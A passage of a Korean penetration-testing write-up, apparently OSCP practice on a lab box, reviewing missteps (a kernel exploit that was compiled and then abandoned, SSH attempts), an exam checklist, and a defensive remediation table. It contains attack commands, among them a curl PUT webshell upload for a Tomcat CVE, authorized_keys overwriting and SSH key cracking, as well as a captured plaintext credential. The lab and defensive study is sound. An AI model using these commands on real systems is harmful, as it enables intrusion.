-rwxrwxr-x 1 kali kali 782560 Jul 10 14:56 exploit
-rw------- 1 kali kali  23024 Jul 10 14:54 exploit.c
```

`exploit.c` 헤더가 정체를 말해준다:

```c
/*
 * CVE-2021-22555: Turning \x00\x00 into 10000$
 * by Andy Nguyen (theflow@)
 *
 * theflow@theflow:~$ gcc -m32 -static -o exploit exploit.c
 ...
 * Exploit tested on Ubuntu 5.8.0-48-generic and COS 5.4.89+.
 */
```

정적 링크 크기(782,560바이트)가 헤더의 `gcc -m32 -static` 지시대로 빌드했음을 뒷받침한다.

**왜 이 방향이었나** — nmap이 `OS details: Linux 5.0 - 5.14`라고 했다. **오탐을 믿었다.**

**왜 버려야 했나** — 소스 안에 답이 있다:

```c
// #define KERNEL_COS_5_4_89 1
#define KERNEL_UBUNTU_5_8_0_48 1
```

```c
      printf("[-] Error ip_tables module is not loaded.\n");
```

1. **하드코딩된 ROP 가젯 오프셋**이 두 커널 빌드(Ubuntu 5.8.0-48 / COS 5.4.89) 전용이다. Debian 10의 4.19 커널에서는 오프셋이 전부 틀리므로 **성공이 아니라 커널 패닉**이 정상 결과다
2. `ip_tables` 모듈이 로드돼 있어야 한다 (`xt_compat_target_from_user`의 힙 오버플로를 트리거하는 경로다)
3. 사용자 네임스페이스(`unshare`) 생성 권한이 필요하다

**어떻게 알아챘나 [가정]** — 실행 로그가 없다. `exploit` 바이너리가 만들어진 뒤 12분 후에 linpeas 결과에서 `start-stop-daemon`을 발견해 root를 잡았으므로, **컴파일까지 하고 실행 전에 더 나은 경로를 찾았거나, 실행했다가 실패하고 열거로 돌아왔다** 중 하나다.

> [!danger] 커널 익스플로잇 손절 규칙 — 시험에서 이걸 어기면 박스 하나를 통째로 잃는다
> 1. **커널 익스플로잇은 열거를 전부 끝낸 뒤 마지막에 본다.** `sudo -l` · SUID · cron · capabilities · 쓰기 가능 서비스 파일 · 프로세스 목록을 먼저 다 훑는다
> 2. **`uname -a`로 커널을 확정한 뒤에 고른다.** nmap의 OS 추측은 근거가 못 된다 (1-1)
> 3. **익스플로잇 소스의 `#define`과 "Tested on"을 읽어라.** 오프셋이 하드코딩돼 있으면 그 빌드 외에는 **패닉**이다
> 4. **박스가 죽으면 리버트해야 하고, 리버트는 20분이다.** 24시간 시험에서 이 20분은 크다
> 5. 정 써야 하면 **로컬에 동일 커널 VM을 세워 먼저 시험**한다 — 시험 중에는 그럴 시간이 없으므로, 결국 **쓰지 마라**는 뜻이다
>
> 이 박스의 정답은 `find / -perm -4000` 한 줄이었다. **커널 익스플로잇을 컴파일하는 데 쓴 시간이 그 한 줄보다 100배 길다.**

### ⑥ `tomcat` 패스워드로 SSH를 시도했다

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ ssh tomcat@192.168.120.100
tomcat@192.168.120.100: Permission denied (publickey).
```

**무엇이 잘못이었나** — 자격증명을 얻으면 반사적으로 SSH에 던지는 것 자체는 옳다(자격증명 재사용은 실제로 자주 통한다). 다만 **`(publickey)` 한 단어를 읽었다면 즉시 접었어야 한다**(3-1).
**교훈** — 서버가 거부한 이유가 괄호 안에 적혀 있다. 재시도 전에 읽어라.

### ⑦ 디렉터리 리스팅을 스캐너에 맡길 뻔했다

feroxbuster가 마지막 줄에서 `=> Directory listing (add --scan-dir-listings to scan)` 라고 알려줬다. **이 줄을 흘려보냈다면** `zipfiles/` 안의 파일 4개를 못 봤을 수 있다 — 워드리스트에 `max`·`sofia`·`francis`·`miriam`이 들어 있어서 우연히 잡힌 것이다.

**교훈** — **스캐너의 마지막 몇 줄(요약·경고)을 읽어라.** 발견 항목만 보고 창을 닫으면 이런 힌트를 통째로 버린다.

### ⑧ 이 유형에서 흔히 막히는 지점 (원문에 실측 기록이 없어 구분해 적는다)

아래는 **이 박스에서 실제로 겪은 기록이 없다.** 같은 유형에서 자주 나오는 함정이라 별도로 표시해 남긴다:

- **`id_rsa` 퍼미션** — 받아온 키가 `644`면 `ssh`가 `UNPROTECTED PRIVATE KEY FILE!` 로 거부한다. `chmod 600 id_rsa`
- **키에 패스프레이즈** — `ssh-keygen -y -f id_rsa`가 패스프레이즈를 물으면 걸린 것이다. `ssh2john id_rsa > h; john h --wordlist=rockyou.txt`
- **원격 `~/.ssh` 퍼미션** — `StrictModes yes`에서 `.ssh`가 `770`이면 키가 거부된다. `chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys`
- **`authorized_keys`에 append 하려다 덮어씀** — 실전에서는 `>>`가 안전하다. 이 박스는 **의도적으로 덮어쓰는 것이 목적**이었으므로 예외다

---

## 7. OSCP 시험 관점 — 이 상황을 다시 만나면 무엇을 먼저 치는가

1. **비표준 포트의 웹부터 본다.** `-p-` 전수 스캔 결과에서 `http`가 여럿이면 **80/443이 아닌 쪽**이 본진일 확률이 높다. 여기서는 7742였다
2. **디렉터리 열거 확장자에 아카이브·백업을 넣는다.** `-x zip,tar.gz,bak,old,sql,conf,txt` — 이 한 줄이 이 박스의 전부였다
3. **디렉터리 리스팅을 발견하면 브라우저로 직접 연다.** 스캐너에 맡기지 않는다
4. **아카이브를 받으면 숨은 파일까지 전부 푼다.** `unzip -l` → `.ssh/` · `.bash_history` · `*.bak` 순서로 본다
5. **`authorized_keys`를 손에 넣었으면 옵션 필드를 먼저 읽는다.** `command=`가 있으면 그것이 함정이자 답이다
6. **SSH 거부 메시지의 괄호를 읽는다.** `(publickey)` = 패스워드 인증 없음 = 패스워드 공략 즉시 중단
7. **제한된 채널을 만나면 "그 채널로 제한 자체를 건드릴 수 있는가"를 묻는다.** scp 전용 → `authorized_keys` 덮어쓰기
8. **`scp`가 실패하면 `-O`.** OpenSSH 9+ 클라이언트와 옛 서버/래퍼의 조합에서 필수
9. **셸을 잡으면 5개를 친다.** `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab`
10. **SUID 목록은 "표준 집합과의 차집합"으로 읽는다.** linpeas의 색·화살표가 아니라 **거기 있으면 안 되는 이름**을 찾는다
11. **GTFOBins 구문은 통째로 외우지 말고 `-p`의 의미를 이해한다.** SUID 셸에 `-p`가 없으면 root가 아니다
12. **CVE는 버전 매칭 후 전제조건을 30초 안에 검증한다.** Tomcat PUT이면 `curl -i -X OPTIONS`. 없으면 즉시 버린다
13. **커널 익스플로잇은 언제나 마지막.** `uname -a` 확정 → 소스의 `#define`/"Tested on" 확인 → 그래도 미심쩍으면 안 쓴다
14. **시간 배분** — 이 박스의 이상적인 배분: 정찰 15분(전수 스캔+열거) · foothold 20분(zip 분석+scp 우회) · 권한상승 10분(SUID 한 줄). **합계 45분.** 실제로는 CVE 두 개에 새면서 훨씬 길어졌다. **손절선은 "가설 하나에 15분"** 이다

> [!tip] 자동 도구 없이 같은 결과를 얻는 방법 (시험 대비)
> | 썼던 것 | 시험 가능 여부 | 수동 대안 |
> |---|---|---|
> | `feroxbuster` | ✅ 허용 (열거 도구) | `for` 루프 + `curl -o /dev/null -w '%{http_code}'` |
> | `whatweb` | ✅ 허용 | `curl -I http://target:port/` + 페이지 소스 |
> | `linpeas.sh` | ✅ 허용 (열거 스크립트) | `find / -perm -4000 -type f 2>/dev/null` 외 4줄 (4-2) |
> | `nmap -sCV -A` | ✅ 허용 | — |
> | **자동 익스플로잇 스크립트** | ⚠️ **CVE-2017-12617 파이썬 스크립트는 "자동 익스플로잇"에 해당할 소지가 있다** | `curl -X PUT --data-binary @shell.jsp 'http://t:8080/shell.jsp/'` 로 **수동 재현** (2-6) |
>
> **결과적으로 이 박스는 자동 익스플로잇 도구를 하나도 쓰지 않고 풀렸다.** 시험 재현성 100%.

---

## 8. 방어 관점

| 문제 | 조치 |
|---|---|
| **웹루트에 홈 디렉터리 백업 배포** | 근본 원인. 백업은 웹서버가 서비스하는 경로 **밖**에 둔다. 부득이하면 nginx에서 확장자 차단: `location ~* \.(zip\|tar\|gz\|bak\|old\|sql)$ { deny all; }` |
| **nginx 디렉터리 리스팅(`autoindex on`)** | 끈다(`autoindex off;` — nginx 기본값). 리스팅이 켜져 있으면 파일명 추측 없이 전부 노출된다 |
| **개인 SSH 키가 백업에 포함** | 개인키는 절대 백업·배포 대상에 넣지 않는다. 유출됐다면 **키를 폐기하고 재발급**한다 — `authorized_keys`에서 제거하는 것만으로는 부족하다(다른 호스트에도 등록돼 있을 수 있다) |
| **`command=` 제한을 사용자 소유 파일에 의존** | **강제 명령을 쓰려면 `authorized_keys`를 사용자가 못 고치게 해야 한다.** `sshd_config`의 `AuthorizedKeysFile /etc/ssh/authorized_keys/%u` 로 root 소유 디렉터리에 두거나, `ForceCommand`를 `Match User` 블록에 넣어 **서버 설정 쪽에서** 강제한다 |
| 래퍼가 `$SSH_ORIGINAL_COMMAND`를 인용 없이 실행 | 명령 주입 위험. 화이트리스트 방식으로 인자를 파싱하거나 **`rssh`/`scponly` 같은 검증된 제한 셸 또는 SFTP `ChrootDirectory`** 를 쓴다 |
| **`tomcat-users.xml.bak` 평문 패스워드** | 백업 자체를 제거. Tomcat은 `digest` 저장을 지원한다(`CredentialHandler`). manager 앱은 **`RemoteAddrValve`로 접근 IP를 제한**한다 |
| **`start-stop-daemon`에 SUID** | 제거: `chmod u-s /usr/sbin/start-stop-daemon`. 데비안 기본은 SUID가 아니다. 데몬 기동은 systemd 유닛으로 처리하고 필요하면 `sudo` 정책으로 좁게 허용 |
| **Tomcat 7.0.4 (EOL)** | Tomcat 7은 **2021-03-31 EOL**이다. 지원 브랜치로 업그레이드. 최소한 `readonly=true`(기본값) 유지 확인 |
| **NFS가 인증 없이 노출** | 익스포트를 `/etc/exports`에서 IP 제한 + `root_squash`(기본) 유지 + 불필요하면 서비스 중지 |
| 로그·탐지 | `authorized_keys` 변경을 **파일 무결성 모니터링**(auditd `-w /home/*/.ssh/`)으로 감시. 이 공격은 **파일 하나 덮어쓰기**라서 로그인 로그만으로는 안 잡힌다 |

---

## 9. 참고 자료

- GTFOBins `start-stop-daemon` (SUID 항목 원문): https://gtfobins.org/gtfobins/start-stop-daemon/
- `start-stop-daemon(8)` man page (`-S`/`-x`/`--`의 정의): https://manpages.debian.org/bookworm/dpkg/start-stop-daemon.8.en.html
- **`dash(1)` man page — `-p`(privileged) 정의.** SUID 셸에서 `-p`가 왜 필수인지의 1차 근거: https://manpages.debian.org/bookworm/dash/dash.1.en.html
- `sshd(8)` — AUTHORIZED_KEYS FILE FORMAT (`command=`·`no-pty`·`restrict`·`SSH_ORIGINAL_COMMAND`): https://man.openbsd.org/sshd.8
- `scp(1)` — `-O` (레거시 SCP 프로토콜 강제): https://man.openbsd.org/scp
- OpenSSH 9.0 릴리스 노트 (`scp` 기본 전송 방식이 SFTP로 변경): https://www.openssh.com/txt/release-9.0
- OpenSSH 8.7 릴리스 노트 (`scp -s`로 SFTP 실험 도입, 9.0에서 제거): https://www.openssh.com/txt/release-8.7
- **Apache Tomcat 보안 공지** — CVE-2017-12617 영향 범위·패치 버전 (7.0.82 / 8.0.47 / 8.5.23 / 9.0.1): https://tomcat.apache.org/security-7.html · https://tomcat.apache.org/security-8.html · https://tomcat.apache.org/security-9.html
- Apache Tomcat DefaultServlet 설정 — **`readonly` 기본값 `[true]`**: https://tomcat.apache.org/tomcat-7.0-doc/default-servlet.html
- **실제 패치 커밋** — `DirResourceSet.write()`의 트레일링 슬래시 거부: https://github.com/apache/tomcat/commit/b7e0435d17aba69f16ae9e8a78ad0f1565b552af
- 선행 커밋 — 검사를 `DefaultServlet`에서 `AbstractFileResourceSet`으로 이동: https://github.com/apache/tomcat/commit/b577f9a7996b92b650b1649af3c3bae11c120db9
- Tomcat 매퍼 소스 (`Mapper.internalMapExtensionWrapper`): https://github.com/apache/tomcat/blob/9.0.1/java/org/apache/catalina/mapper/Mapper.java
- Apache Tomcat 7 아카이브 (`v7.0.4-beta` 확인): https://archive.apache.org/dist/tomcat/tomcat-7/
- 사용한 CVE-2017-12617 익스플로잇 (Python 3 포팅, LongWayHomie): https://github.com/LongWayHomie/CVE-2017-12617
- CVE-2021-22555 원저자 글 (Andy Nguyen, `theflow@`) — netfilter `xt_compat_target_from_user` 힙 OOB: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
- Tomcat manager 롤 구분(`manager-gui` vs `manager-script`): https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html

## 남긴 흔적 (랩 정리용)

- **타겟 파일 변경**: `/home/max/.ssh/authorized_keys` 를 **옵션 필드가 제거된 버전으로 덮어썼다.** 원본은 `~/PG/Sorcerer/max/.ssh/authorized_keys.bak` 에 보관돼 있다 — 복구하려면 그 파일을 같은 경로로 되올린다
- **업로드 파일**: `/home/max/linpeas.sh` (삭제하지 않았다)
- **컴파일 산출물**: `~/PG/Sorcerer/exploit`(CVE-2021-22555, 칼리 로컬). **타겟에는 올리지 않았다**
- **획득 자격증명**: `max` 개인 SSH 키(패스프레이즈 없음) · Tomcat manager `tomcat` / `VTUD2XxJjf5LPmu6`

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_STATUS]] — PG 전수 진행현황
- [[Pelican]] — 같은 Debian 10 / OpenSSH 7.9p1 배너. **`uname` 실측이 4.19였다** — 1-1의 nmap OS 오탐 반증 근거
- [[Squid]] · [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — 누적 패턴 **"응답이 성공을 뜻하지 않는다"** (3-3의 scp 전송 검증이 같은 계열)
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] — 누적 패턴 **"버전 판정은 독립 근거 2개"** (1-1의 커널 버전 오탐)
- [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] — 누적 패턴 "크론 기반 권한상승" (이 박스는 SUID 계열)
